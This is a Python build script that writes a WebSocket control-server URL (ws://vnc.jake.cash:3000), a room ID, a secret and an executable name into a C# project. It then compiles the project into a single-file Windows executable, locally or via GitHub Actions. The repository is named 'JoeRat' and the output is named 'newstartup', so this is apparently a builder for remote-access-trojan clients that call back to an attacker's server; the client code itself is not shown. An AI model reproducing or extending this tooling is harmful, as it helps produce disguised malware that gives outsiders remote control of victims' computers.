#!/usr/bin/env python3

import os
import sys
import json
import shutil
import subprocess
import threading
from pathlib import Path

class CombinedBuilder:
    def __init__(self):
        self.project_root = Path(__file__).parent
        self.project_file = self.project_root / "csharpsender" / "CSharpSender" / "CSharpSender.csproj"
        self.build_dir = self.project_root / "build"
        self.config_dir = self.project_root / "configs"
        self.github_repo = "Lonhaax/JoeRat"
        self.github_pat = "YOUR_GITHUB_TOKEN_HERE"  # Replace with your token
        
    def update_build_config(self, ws_url, room_id, secret, exe_name):
        """Update BuildConfig.cs with custom settings"""
        build_config_path = self.project_root / "csharpsender" / "CSharpSender" / "BuildConfig.cs"
        
        config_content = f"""namespace CSharpSender;
internal static class BuildConfig
{{
    public const string DefaultWsUrl  = "{ws_url}";
    public const string DefaultRoomId = "{room_id}";
    public const string DefaultSecret = "{secret}";
    public const string ExeName       = "{exe_name}";
}}
"""
        
        try:
            with open(build_config_path, 'w', encoding='utf-8') as f:
                f.write(config_content)
            print(f"✅ Updated BuildConfig.cs with custom settings")
            return True
        except Exception as e:
            print(f"❌ Failed to update BuildConfig.cs: {e}")
            return False
    
    def build_local_executable(self, exe_name):
        """Build the executable locally"""
        try:
            # Clean previous build
            if self.build_dir.exists():
                shutil.rmtree(self.build_dir)
            
            # Build command
            cmd = [
                'dotnet', 'publish',
                str(self.project_file),
                '-c', 'Release',
                '-o', str(self.build_dir),
                '--self-contained', 'true',
                '-r', 'win-x64',
                '-p:PublishSingleFile=true'
            ]
            
            print(f"🔨 Building {exe_name}.exe...")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            if result.returncode == 0:
                # Rename to custom name if needed
                built_exe = self.build_dir / "CSharpSender.exe"
                target_exe = self.build_dir / f"{exe_name}.exe"
                
                if built_exe.exists() and exe_name != "CSharpSender":
                    built_exe.rename(target_exe)
                
                size_mb = target_exe.stat().st_size / (1024 * 1024)
                print(f"✅ Build successful: {target_exe}")
                print(f"📊 Size: {size_mb:.1f} MB")
                return True, target_exe
            else:
                print(f"❌ Build failed: {result.stderr}")
                return False, None
                
        except subprocess.TimeoutExpired:
            print("❌ Build timed out")
            return False, None
        except Exception as e:
            print(f"❌ Build error: {e}")
            return False, None
    
    def trigger_github_build(self, ws_url, room_id, secret, exe_name):
        """Trigger GitHub Actions build"""
        try:
            import urllib.request
            import json
            import time
            
            # Update config first
            if not self.update_build_config(ws_url, room_id, secret, exe_name):
                return False, None
            
            # Commit and push changes
            print("📝 Committing configuration changes...")
            os.chdir(self.project_root)
            
            subprocess.run(['git', 'add', '.'], capture_output=True)
            subprocess.run(['git', 'commit', '-m', f'Build {exe_name} for room {room_id}'], capture_output=True)
            subprocess.run(['git', 'push', 'origin', 'master'], capture_output=True)
            
            # Trigger GitHub Actions workflow
            api_url = f'https://api.github.com/repos/{self.github_repo}/actions/workflows/build-sender.yml/dispatches'
            
            body = json.dumps({
                'ref': 'master',
                'inputs': {
                    'ws_url': ws_url,
                    'room_id': room_id,
                    'secret': secret,
                    'exe_name': exe_name
                }
            }).encode('utf-8')
            
            req = urllib.request.Request(api_url, data=body, method='POST')
            req.add_header('Authorization', f'Bearer {self.github_pat}')
            req.add_header('Accept', 'application/vnd.github+json')
            req.add_header('Content-Type', 'application/json')
            req.add_header('X-GitHub-Api-Version', '2022-11-28')
            
            print("🚀 Triggering GitHub Actions build...")
            with urllib.request.urlopen(req, timeout=15) as resp:
                if resp.status == 204:
                    print("✅ GitHub Actions build triggered successfully!")
                    print("⏳ Check GitHub Actions for build progress...")
                    return True, None
                else:
                    print(f"❌ Failed to trigger build: HTTP {resp.status}")
                    return False, None
                    
        except Exception as e:
            print(f"❌ GitHub build error: {e}")
            return False, None
    
    def build_combined(self, ws_url, room_id, secret, exe_name, use_github=False):
        """Combined build system - local + GitHub"""
        print(f"🚀 Starting combined build for: {exe_name}")
        print(f"📡 WebSocket URL: {ws_url}")
        print(f"🏠 Room ID: {room_id}")
        print(f"🔐 Secret: {secret}")
        print(f"🌐 Build method: {'GitHub Actions' if use_github else 'Local'}")
        print()
        
        # Update configuration
        if not self.update_build_config(ws_url, room_id, secret, exe_name):
            return False, None
        
        # Choose build method
        if use_github:
            return self.trigger_github_build(ws_url, room_id, secret, exe_name)
        else:
            return self.build_local_executable(exe_name)
    
    def get_build_status(self):
        """Get current build status"""
        status = {
            'local_builds': [],
            'github_repo': self.github_repo,
            'project_file': str(self.project_file),
            'build_dir': str(self.build_dir)
        }
        
        # Check local builds
        if self.build_dir.exists():
            for exe_file in self.build_dir.glob("*.exe"):
                stats = exe_file.stat()
                status['local_builds'].append({
                    'name': exe_file.name,
                    'size_mb': round(stats.st_size / (1024 * 1024), 1),
                    'modified': stats.st_mtime
                })
        
        return status

def main():
    builder = CombinedBuilder()
    
    print("🔧 Combined Build System for CSharpSender")
    print("=" * 50)
    
    # Example configuration
    ws_url = "ws://vnc.jake.cash:3000"
    room_id = "ops-room"
    secret = "boi123"
    exe_name = "newstartup"
    
    # Choose build method
    use_github = False  # Set to True for GitHub Actions, False for local build
    
    print(f"📋 Build Configuration:")
    print(f"   Executable: {exe_name}")
    print(f"   WebSocket: {ws_url}")
    print(f"   Room: {room_id}")
    print(f"   Method: {'GitHub Actions' if use_github else 'Local Build'}")
    print()
    
    # Run build
    success, result = builder.build_combined(ws_url, room_id, secret, exe_name, use_github)
    
    if success:
        print(f"\n🎉 Build completed successfully!")
        if result:
            print(f"📁 Output: {result}")
        
        # Show status
        status = builder.get_build_status()
        print(f"\n📊 Build Status:")
        print(f"   GitHub Repo: {status['github_repo']}")
        print(f"   Local Builds: {len(status['local_builds'])}")
        for build in status['local_builds']:
            print(f"   - {build['name']} ({build['size_mb']} MB)")
    else:
        print(f"\n❌ Build failed")
        
        # Show troubleshooting tips
        print(f"\n🔧 Troubleshooting:")
        if use_github:
            print(f"   - Check GitHub token permissions")
            print(f"   - Verify repository is public")
            print(f"   - Check GitHub Actions workflow")
        else:
            print(f"   - Verify .NET SDK is installed")
            print(f"   - Check project file path")
            print(f"   - Ensure sufficient disk space")

if __name__ == "__main__":
    main()
